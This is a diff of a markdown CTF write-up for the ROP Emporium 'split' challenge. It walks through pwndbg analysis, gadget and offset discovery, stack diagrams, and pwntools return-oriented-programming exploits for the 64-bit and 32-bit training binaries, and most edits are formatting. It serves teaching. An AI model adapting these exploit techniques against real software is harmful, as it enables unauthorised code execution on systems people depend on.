@@ -5,8 +5,14 @@ pagination_prev: null
 sidebar_position: 2
 ---
 
+:::note
+I will be using pwndbg to solve the 64 bit and the 32 bit. You can use [this](https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8) walkthrough to install both of those plugins. 
+:::
+
 ## 64 bit
+
 Let's run the executable to check what it does.
+
 ```
 $ ./split
 split by ROP Emporium
@@ -18,7 +24,9 @@ Thank you!
 
 Exiting
 ```
+
 It takes user input and then exits.
+
 
 We can use the `checksec` utility in order to identify the security properties of the binary executable.
 ```
@@ -30,10 +38,13 @@ $ checksec split
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+
 There's two important properties we want to focus on here:
 	- `NX enabled`: This means that the stack is not executable. Therefore we cannot use a shellcode injection.
 	- `No PIE (0x400000)`: This means that the executable is not positionally independent and it is always loaded at address `0x400000`. So the code and memory regions will have the same address every time we run it. 
+
 Let's open the executable using `gdb-pwndbg` and look at the functions.
+
 ```
 pwndbg> info functions
 All defined functions:
@@ -59,9 +70,11 @@ Non-debugging symbols:
 0x00000000004007d0  __libc_csu_fini
 0x00000000004007d4  _fini
 ```
+
 There is a function called `usefulFunction`. Let's disassemble it and see how useful it is.
 
-### usefulFunction()
+### `usefulFunction()`
+
 ```
 pwndbg> disassemble usefulFunction
 Dump of assembler code for function usefulFunction:
@@ -74,38 +87,52 @@ Dump of assembler code for function usefulFunction:
    0x0000000000400752 <+16>:    ret
 End of assembler dump.
 ```
-We can see that the instruction at `usefulFunction+9` makes a system call and that the instruction at `usefulFunction+4` loads the argument.
+
+We can see that the instruction at `usefulFunction()+9` makes a system call and that the instruction at `usefulFunction()+4` loads the argument.
+
 ```
 pwndbg> x/s 0x40084a
 0x40084a:       "/bin/ls"
 ```
+
 So this system call executes `/bin/ls` which isn't what we want. We want it to execute `/bin/cat flag.txt`.
 
-### /bin/cat flag.txt
+### `/bin/cat flag.txt`
+
 Let's search the string `/bin/cat flag.txt`.
+
 ```
 pwndbg> search /bin/cat
 Searching for value: '/bin/cat'
 split           0x601060 '/bin/cat flag.txt'
 ```
+
 We can link this string with our system call in order to read the `flag.txt` file.
+
 In order to put this string into `rdi`, we will need a `pop rdi` gadget.
 
-### pop rdi gadget
+### `pop rdi` gadget
+
 We can find the gadget using the `ROPgadget` utility. 
+
 ```
 $ ROPgadget --binary split | grep "pop rdi ; ret"
 0x00000000004007c3 : pop rdi ; ret
 ```
+
 We can see that the address of the `pop rdi` gadget is `0x00000000004007c3`. 
 
 ### Cyclic pattern
+
 We now have to find the offset using a cyclic pattern.
+
 ```
 pwndbg> cyclic
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
 ```
+
 Let's provide this as input.
+
 ```
 ──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 *RAX  0xb
@@ -126,39 +153,45 @@ Let's provide this as input.
 *RSP  0x7fffffffdeb8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
 *RIP  0x400741 (pwnme+89) ◂— ret
 ```
+
 The `rbp` register points to `0x6161616161616165` which is the little endian `eaaaaaaa` in ASCII.
 
 Let's find the offset of this value in our cyclic pattern.
+
 ```
 pwndbg> cyclic -l 0x6161616161616165
 Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
 Found at offset 32
 ```
+
 So the offset is 32 bytes.
 
 Let's see how this looks on the stack.
 
 ### Stack
+
 ```
-<======: Value is stored at that location
-<------: Points to the address
+<==: Value is stored at that location
+<--: Points to the address
 
 +---------------------------+ 
-|  61 61 61 61 61 61 61 61  | <====== buffer (32 bytes) <------ rsp
+|  61 61 61 61 61 61 61 61  | <== buffer (32 bytes) <-- rsp
 |  62 61 61 61 61 61 61 61  | 
 |  63 61 61 61 61 61 61 61  |
 |  64 61 61 61 61 61 61 61  |
 +---------------------------+
-|  65 61 61 61 61 61 61 61  | <====== stored rbp <------ rbp
+|  65 61 61 61 61 61 61 61  | <== stored rbp <-- rbp
 +---------------------------+
-|  66 61 61 61 61 61 61 61  | <====== return address <------ rip
+|  66 61 61 61 61 61 61 61  | <== return address <-- rip
 +---------------------------+
 ```
+
 We can see that if we increment the `rbp` by 8, it will point to the saved return address.
 
 Therefore the distance between the buffer and the saved return address is `offset+8` which is equal to 40.
 
 ### Exploit requirements
+
 We have all the knowledge we need to create an exploit.
 	- [x] Number of padding bytes: `40`
 	- [x] Address of `pop rdi ; ret` gadget: `0x00000000004007c3`
@@ -168,15 +201,18 @@ We have all the knowledge we need to create an exploit.
 All that remains is to link these pieces of information to create a ROP chain.
 
 ### ROP chain
+
 In this technique, we have to execute our instructions in a carefully chosen sequence:
 	1. First we have to replace the `return address` with the address of the `pop rdi` gadget so that it is executed when `pwnme` returns.
 	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it gets popped into the `rdi register`.
 	3. Finally we chain it with the address of the `system@plt` call.
+
 This is what the ROP chain would look like on the stack.
+
 ```
 Stack:
 +---------------------------+
-|  00 00 00 00 00 40 07 c3  | <====== return address <------ rsp
+|  00 00 00 00 00 40 07 c3  | <== return address <-- rsp
 |  ( pop rdi ; ret )        |
 +---------------------------+
 |  00 00 00 00 00 60 10 60  | 
@@ -187,13 +223,13 @@ Stack:
 +---------------------------+
 
 ===================================================================================
-pwnme() return <------ rip
-# This gadget will pop the value pointed to by rsp into rip
+pwnme() return <-- rip
+## This gadget will pop the value pointed to by rsp into rip
 ===================================================================================
 
 Stack:
 +---------------------------+
-|  00 00 00 00 00 60 10 60  | <------ rsp
+|  00 00 00 00 00 60 10 60  | <-- rsp
 |  ( /bin/cat flag.txt )    |
 +---------------------------+
 |  00 00 00 00 00 40 07 4b  |
@@ -201,13 +237,13 @@ Stack:
 +---------------------------+
 
 ===================================================================================
-pop rdi <------ rip
-# pop rdi: pop the value pointed to by rsp into rdi and move the rsp 8 bytes higher
+pop rdi <-- rip
+## pop rdi: pop the value pointed to by rsp into rdi and move the rsp 8 bytes higher
 ===================================================================================
 
 Stack:
 +---------------------------+
-|  00 00 00 00 00 40 07 4b  | <------ rsp
+|  00 00 00 00 00 40 07 4b  | <-- rsp
 |  ( system@plt )           |
 +---------------------------+
 
@@ -215,12 +251,14 @@ Registers:
 rdi: 0x601060
 
 ===================================================================================
-ret <------ rip
-# This gadget will move the address of system@plt into rip, this executong it
+ret <-- rip
+## This gadget will move the address of system@plt into rip, this executong it
 ===================================================================================
 ```
+
 ### Exploit
-```python
+
+```python title="exploit64.py"
 from pwn import *
 
 padding = b"a"*40
@@ -234,9 +272,11 @@ p = process('./split')
 p.sendline(payload) 
 p.interactive()
 ```
+
 Let's run the exploit.
+
 ```
-$ python exploit.py 
+$ python exploit64.py 
 [+] Starting local process './split': pid 987
 [*] Switching to interactive mode
 split by ROP Emporium
@@ -250,7 +290,9 @@ ROPE{a_placeholder_32byte_flag!}
 &nbsp;
 
 ## 32 bit
-### usefulFunction()
+
+### `usefulFunction()`
+
 ```
 pwndbg> disassemble usefulFunction
 Dump of assembler code for function usefulFunction:
@@ -266,32 +308,41 @@ Dump of assembler code for function usefulFunction:
    0x08048624 <+24>:    ret
 End of assembler dump.
 ```
+
 The arguments for a 32-bit function call are pushed on the stack. At `usefulFunction+9`, we can see the argument for the system call being pushed onto the stack.
 
 Let's see what the argument is.
+
 ```
 pwndbg> x/s 0x804870e
 0x804870e:      "/bin/ls"
 ```
+
 We have to replace this argument with `/bin/cat flag.txt`.
 
-### /bin/cat flag.txt
+### `/bin/cat flag.txt`
+
 ```
 pwndbg> search /bin/cat
 Searching for value: '/bin/cat'
 split32         0x804a030 '/bin/cat flag.txt'
 ```
+
 We can link this string with our system call in order to read the `flag.txt` file.
 
 In this case we do not need a `pop rdi` gadget because as we saw the arguments are not stored in registers.
 
 ### Cyclic pattern
+
 We now have to find the offset using a cyclic pattern.
+
 ```
 pwndbg> cyclic
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 ```
+
 Let's provide this as input.
+
 ```
 ──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
 *EAX  0xb
@@ -304,25 +355,28 @@ Let's provide this as input.
 *ESP  0xffffd030 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
 *EIP  0x61616161 ('aaaa')
 ```
+
 The `ebp` register points to `0x61616166` which is the little endian `faaa` in ASCII.
 
 Let's find the offset of this value in our cyclic pattern.
+
 ```
 pwndbg> cyclic -l 0x61616166
 Finding cyclic pattern of 8 bytes: b'faaa' (hex: 0x61616166)
 Found at offset 40
 ```
+
 So the offset is 40 bytes.
 
 Let's see how this looks on the stack.
 
 ### Stack
 ```
-<======: Value is stored at that location
-<------: Points to the address
+<== Value is stored at that location
+<-- Points to the address
 
 +---------------+ 
-|  61 61 61 61  | <====== buffer (40 bytes) <------ esp
+|  61 61 61 61  | <== buffer (40 bytes) <-- esp
 |  62 61 61 61  | 
 |  63 61 61 61  |
 |  64 61 61 61  |
@@ -333,15 +387,18 @@ Let's see how this looks on the stack.
 |  69 61 61 61  |
 |  6A 61 61 61  |
 +---------------+
-|  6B 61 61 61  | <====== stored ebp <------ ebp
+|  6B 61 61 61  | <== stored ebp <-- ebp
 +---------------+
-|  6C 61 61 61  | <====== return address
+|  6C 61 61 61  | <== return address
 +---------------+
 ```
+
 We can see that if we increment the `ebp` by 4, it will point to the saved return address.
 
 Therefore the distance between the buffer and the saved return address is `offset+4` which is equal to 44.
+
 ### Exploit requirements
+
 We have all the knowledge we need to create an exploit.
 	- [x] Number of padding bytes: `44`
 	- [x] Address of `/bin/cat flag.txt`: `0x804a030`
@@ -350,14 +407,17 @@ We have all the knowledge we need to create an exploit.
 All that remains is to link these pieces of information to create a ROP chain.
 
 ### ROP chain
+
 In this technique, we have to execute our instructions in a carefully chosen sequence:
 	1. First we have to replace the `return address` with the address of the `system@plt` call so that it is executed when `pwnme` returns.
 	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it can act as the argument of the `system@plt` call.
+
 This is what the ROP chain would look like on the stack.
+
 ```
 Stack:-
 +--------------------------+
-|   08    04    86    1a   | <====== return address <------ esp
+|   08    04    86    1a   | <== return address <-- esp
 |  ( system@plt )          |
 +--------------------------+
 |   08    04    a0    30   |
@@ -365,23 +425,26 @@ Stack:-
 +--------------------------+
 
 =====================================================================
-pwnme() return <------ eip
-# This gadget will pop the value pointed to by the esp into eip
+pwnme() return <-- eip
+## This gadget will pop the value pointed to by the esp into eip
 =====================================================================
 
 Stack:-
 +--------------------------+
-|   08    04    a0    30   | <------ esp
+|   08    04    a0    30   | <-- esp
 |  ( /bin/cat flag.txt )   |
 +--------------------------+
 
 =====================================================================
-call <system@plt> <------ eip
-# This gadget makes a system call based on the argument on the stack
+call <system@plt> <-- eip
+## This gadget makes a system call based on the argument on the stack
 =====================================================================
+
 ```
+
 ### Exploit
-```python
+
+```python title="exploit32.py"
 from pwn import *
 
 padding = b"a"*44
@@ -394,9 +457,11 @@ p = process('./split32')
 p.sendline(payload) 
 p.interactive()
 ```
+
 Let's run the exploit.
+
 ```
-$ python exploit.py 
+$ python exploit32.py 
 [+] Starting local process './split32': pid 16511
 [*] Switching to interactive mode
 split by ROP Emporium
